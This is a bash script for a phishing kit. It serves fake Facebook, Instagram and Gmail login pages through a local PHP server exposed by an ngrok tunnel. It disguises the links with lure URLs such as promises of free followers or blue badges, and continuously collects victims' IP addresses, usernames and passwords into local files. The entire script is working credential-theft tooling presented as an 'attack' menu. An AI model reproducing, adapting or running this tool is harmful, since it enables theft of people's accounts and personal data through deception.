#!/bin/bash

RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

## Directories
if [[ ! -d ".server" ]]; then
	mkdir -p ".server"
fi
if [[ -d ".server/www" ]]; then
	rm -rf ".server/www"
	mkdir -p ".server/www"
else
	mkdir -p ".server/www"
fi

## Script termination
exit_on_signal_SIGINT() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
    exit 0
}

exit_on_signal_SIGTERM() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
    exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## Reset terminal colors
reset_color() {
	tput sgr0   # reset attributes
	tput op     # reset color
    return
}

## Kill already running process
kill_pid() {
	if [[ `pidof php` ]]; then
		killall php > /dev/null 2>&1
	fi
	if [[ `pidof ngrok` ]]; then
		killall ngrok > /dev/null 2>&1
	fi	
}

## Banner
banner() {
	cat <<- EOF
  ${RED}      _   _ __   __  _    _ ______ _    _ _  ___          ___  __
     ${ORANGE}  | \ | /_ | / / | |  | |____  | |  | | || \ \        / / |/ /
   ${BLUE}    |  \| || |/ /_ | |__| |   / /| |__| | || |\ \  /\  / /| ' / 
   ${BLUE}    |     || |  _ \|  __  |  / / |  __  |__   _\ \/  \/ / |  <  
    ${GREEN}   | |\  || | (_) | |  | | / /  | |  | |  | |  \  /\  /  | . \ 
    ${GREEN}   |_| \_||_|\___/|_|  |_|/_/   |_|  |_|  |_|   \/  \/   |_|\_\                                                       
		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by Nighthawk ${WHITE}
	EOF
}

## Small Banner
banner_small() {
	cat <<- EOF
  ${RED}      _   _ __   __  _    _ ______ _    _ _  ___          ___  __
     ${ORANGE}  | \ | /_ | / / | |  | |____  | |  | | || \ \        / / |/ /
   ${BLUE}    |  \| || |/ /_ | |__| |   / /| |__| | || |\ \  /\  / /| ' / 
   ${BLUE}    |     || |  _ \|  __  |  / / |  __  |__   _\ \/  \/ / |  <  
    ${GREEN}   | |\  || | (_) | |  | | / /  | |  | |  | |  \  /\  /  | . \ 
    ${GREEN}   |_| \_||_|\___/|_|  |_|/_/   |_|  |_|  |_|   \/  \/   |_|\_\                                                                 
	EOF
}

## Dependencies
dependencies() {
	echo -e "\n${GREEN} Installing..."

    if [[ -d "/data/data/com.termux/files/home" ]]; then
        if [[ `command -v proot` ]]; then
            printf ''
        else
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing... : ${ORANGE}proot${CYAN}"${WHITE}
            pkg install proot resolv-conf -y
        fi
    fi

	if [[ `command -v php` && `command -v wget` && `command -v curl` && `command -v unzip` ]]; then
		echo -e "\n${GREEN} Please Wait...."
	else
		pkgs=(php curl wget unzip)
		for pkg in "${pkgs[@]}"; do
			type -p "$pkg" &>/dev/null || {
				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
				if [[ `command -v pkg` ]]; then
					pkg install "$pkg"
				elif [[ `command -v apt` ]]; then
					apt install "$pkg" -y
				elif [[ `command -v apt-get` ]]; then
					apt-get install "$pkg" -y
				elif [[ `command -v pacman` ]]; then
					sudo pacman -S "$pkg" --noconfirm
				elif [[ `command -v dnf` ]]; then
					sudo dnf -y install "$pkg"
				else
					echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
					{ reset_color; exit 1; }
				fi
			}
		done
	fi

}

## Download Ngrok
download_ngrok() {
	url="$1"
	file=`basename $url`
	if [[ -e "$file" ]]; then
		rm -rf "$file"
	fi
	wget --no-check-certificate "$url" > /dev/null 2>&1
	if [[ -e "$file" ]]; then
		unzip "$file" > /dev/null 2>&1
		mv -f ngrok .server/ngrok > /dev/null 2>&1
		rm -rf "$file" > /dev/null 2>&1
		chmod +x .server/ngrok > /dev/null 2>&1
	else
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured, Try Again."
		{ reset_color; exit 1; }
	fi
}

## Install ngrok
install_ngrok() {
	if [[ -e ".server/ngrok" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN}"
	else
		echo -e 
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip'
		else
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip'
		fi
	fi

}

## Exit message
msg_exit() {
	{ clear; banner; echo; }
	echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
	{ reset_color; exit 0; }
}

## About
about() {
	{ clear; banner; echo; }
	cat <<- EOF
		${GREEN}Author   ${RED}:  ${ORANGE}Tanvir Ahamed${RED}[ ${ORANGE}Nighthawk ${RED}]
		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/Nighthawk-N16H7H4WK
		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	if [[ "$REPLY" == 99 ]]; then
		msg_exit
	elif [[ "$REPLY" == 0 || "$REPLY" == 00 ]]; then
		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
		{ sleep 1; main_menu; }
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Error, Try Again..."
		{ sleep 1; about; }
	fi
}


HOST='127.0.0.1'
PORT='8080'

setup_site() {
	echo -e 
	cp -rf .sites/"$website"/* .server/www
	cp -f .sites/ip.php .server/www/
	echo -ne 
	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
}


capture_ip() {
	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Victim's IP : ${BLUE}$IP"
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}ip.txt"
	cat .server/www/ip.txt >> ip.txt
}


capture_creds() {
	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | cut -d " " -f2)
	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | cut -d ":" -f2)
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Account : ${BLUE}$ACCOUNT"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Password : ${BLUE}$PASSWORD"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}usernames.dat"
	cat .server/www/usernames.txt >> usernames.dat
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Victim, ${BLUE}Ctrl + C ${ORANGE}to exit. "
}


capture_data() {
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + z ${ORANGE}to exit..."
	while true; do
		if [[ -e ".server/www/ip.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
			capture_ip
			rm -rf .server/www/ip.txt
		fi
		sleep 0.75
		if [[ -e ".server/www/usernames.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!"
			capture_creds
			rm -rf .server/www/usernames.txt
		fi
		sleep 0.75
	done
}

## Start ngrok
start_ngrok() {
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Getting link..."

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & 
    else
        sleep 2 && ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
    fi

	{ sleep 8; clear; banner_small; }
	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
	ngrok_url1=${ngrok_url#https://}
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${RED}$ngrok_url"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$ngrok_url1"
	capture_data
}



tunnel_menu() {
	{ clear; banner_small; }
	cat <<- EOF
		${RED}[${WHITE}01${RED}]${ORANGE} Ngrok
	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select  : ${BLUE}"


	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		start_ngrok
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
		{ sleep 1; tunnel_menu; }
	fi
}

## Facebook
site_facebook() {
	cat <<- EOF
		${RED}[${WHITE}01${RED}]${ORANGE} Login Page
		${RED}[${WHITE}02${RED}]${ORANGE} Voting Poll
		${RED}[${WHITE}03${RED}]${ORANGE} Messenger Page
	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		website="facebook"
		mask='http://blue-verified-badge-for-facebook-free'
		tunnel_menu
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		website="fb_advanced"
		mask='http://vote-for-the-best-social-media'
		tunnel_menu
	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
		website="fb_messenger"
		mask='http://get-messenger-premium-features-free'
		tunnel_menu
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
		{ sleep 1; clear; banner_small; site_facebook; }
	fi
}

## Instagram
site_instagram() {
	cat <<- EOF
		${RED}[${WHITE}01${RED}]${ORANGE} Login Page
		${RED}[${WHITE}02${RED}]${ORANGE} Auto Followers
		${RED}[${WHITE}03${RED}]${ORANGE} Blue Badge Verify
	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		website="instagram"
		mask='http://get-unlimited-followers-for-instagram'
		tunnel_menu
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		website="ig_followers"
		mask='http://get-unlimited-followers-for-instagram'
		tunnel_menu
	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
		website="ig_verify"
		mask='http://blue-badge-verify-for-instagram-free'
		tunnel_menu
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
		{ sleep 1; clear; banner_small; site_instagram; }
	fi
}

## Gmail/Google
site_gmail() {
	cat <<- EOF
		${RED}[${WHITE}01${RED}]${ORANGE} Gmail Old
		${RED}[${WHITE}02${RED}]${ORANGE} Gmail New
		${RED}[${WHITE}03${RED}]${ORANGE} Advanced Voting Poll
	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		website="google"
		mask='http://get-unlimited-google-drive-free'
		tunnel_menu
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		website="google_new"
		mask='http://get-unlimited-google-drive-free'
		tunnel_menu
	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
		website="google_poll"
		mask='http://vote-for-the-best-social-media'
		tunnel_menu
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
		{ sleep 1; clear; banner_small; site_gmail; }
	fi
}


## Menu
main_menu() {
	{ clear; banner; echo; }
	cat <<- EOF
		${RED}[${WHITE}::${RED}]${RED} Select An Attack ${RED}[${WHITE}::${RED}]${ORANGE}
		${RED}[${WHITE}01${RED}]${ORANGE} Facebook    ${RED}[${WHITE}02${RED}]${ORANGE} Instagram 
${RED}[${WHITE}03${RED}]${ORANGE} Google   		
		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
	EOF
	
	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select: ${BLUE}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		site_facebook
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		site_instagram
	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
		site_gmail
	elif [[ "$REPLY" == 99 ]]; then
		about
	elif [[ "$REPLY" == 0 || "$REPLY" == 00 ]]; then
		msg_exit
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
		{ sleep 1; main_menu; }
	fi
}


kill_pid
dependencies
install_ngrok
main_menu
